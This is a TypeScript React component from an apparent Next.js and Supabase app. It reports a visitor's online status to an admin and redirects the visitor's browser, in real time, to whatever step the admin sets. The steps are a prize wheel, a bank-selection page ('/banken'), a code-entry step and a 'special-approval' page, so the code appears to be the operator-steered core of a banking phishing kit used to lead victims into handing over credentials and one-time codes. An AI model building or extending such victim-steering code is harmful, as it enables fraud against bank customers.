"use client";

import { useEffect } from "react";
import { usePathname } from "next/navigation";
import type { SessionStatus, SessionStep } from "@/types/session";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { logAuditEvent } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";

function shouldPauseBankListRedirects(pathname: string) {
  if (!pathname.startsWith("/banken")) return false;

  try {
    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
  } catch {
    return false;
  }
}

export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
  const pathname = usePathname();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);

  /* Presence: demo ortamında admin için online göstergesi */
  useEffect(() => {
    persistActiveSession(sessionId, effectiveRouteSessionId);
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const pulse = () => {
      void supabase
        .from("sessions")
        .update({ status: "online" })
        .eq("id", sessionId);
    };

    pulse();
    logAuditEvent({
      session_id: sessionId,
      public_id: effectiveRouteSessionId,
      event_kind: "presence",
      event_action: "session_mount",
      pathname,
      meta: { effectiveRouteSessionId, pulse_interval_ms: 8000 },
    });
    const t = window.setInterval(pulse, 8000);
    const markOffline = () => {
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "presence",
        event_action: "session_mark_offline",
        status: "warn",
        pathname,
      });
      void supabase
        .from("sessions")
        .update({ status: "offline" })
        .eq("id", sessionId);
    };

    const onVisibility = () => {
      if (document.visibilityState === "hidden") markOffline();
      else pulse();
    };

    window.addEventListener("pagehide", markOffline);
    document.addEventListener("visibilitychange", onVisibility);

    return () => {
      window.clearInterval(t);
      window.removeEventListener("pagehide", markOffline);
      document.removeEventListener("visibilitychange", onVisibility);
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* İlk yüklemede sunucu adımı ile senkron */
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (shouldPauseBankListRedirects(pathname)) return;
      const supabase = createBrowserSupabaseClient();
      if (supabase === null) return;
      const { data } = await supabase.from("sessions").select("current_step,status,form_data").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) return;
      const status = data.status as SessionStatus | undefined;
      if (status === "SPECIAL_INFO") {
        if (!pathname.startsWith("/special-approval")) {
          window.location.href = "/special-approval";
        }
        return;
      }

      if (!data.current_step) return;
      const serverStep = data.current_step as SessionStep;
      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith("/wheel")) local = "wheel";

      if (local === "wheel" && serverStep === "code_entry") return;
      if (local === "banken" && serverStep === "bank") return;

      if (local && serverStep !== local) {
        const target = resolveStepTargetPath(
          serverStep,
          sessionId,
          effectiveRouteSessionId,
          (data.form_data ?? {}) as { bankSlug?: string | null },
        );
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "step",
          event_action: "server_step_redirect",
          from_step: local,
          to_step: serverStep,
          pathname,
          meta: { reason: "initial_sync" },
        });
        window.location.href = target;
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* Realtime: admin current_step değişince anında yönlendir */
  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const channel = supabase
      .channel(`demo-session:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          if (shouldPauseBankListRedirects(pathname)) {
            return;
          }
          const next = payload.new as {
            current_step?: SessionStep;
            status?: SessionStatus;
            form_data?: { bankSlug?: string | null } | null;
          };
          if (next.status === "SPECIAL_INFO") {
            if (!pathname.startsWith("/special-approval")) {
              window.location.href = "/special-approval";
            }
            return;
          }

          if (!next.current_step) return;
          let local: string | null = pathToStep(pathname);
          if (pathname.startsWith("/wheel")) local = "wheel";

          if (local === "wheel" && next.current_step === "code_entry") return;
          if (local === "banken" && next.current_step === "bank") return;

          if (local && next.current_step !== local) {
            const target = resolveStepTargetPath(
              next.current_step,
              sessionId,
              effectiveRouteSessionId,
              (next.form_data ?? {}) as { bankSlug?: string | null },
            );
            logAuditEvent({
              session_id: sessionId,
              public_id: effectiveRouteSessionId,
              event_kind: "step",
              event_action: "admin_realtime_redirect",
              from_step: local,
              to_step: next.current_step,
              pathname,
              meta: { reason: "realtime_channel", status: next.status ?? null },
            });
            window.location.href = target;
          }
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  return null;
}
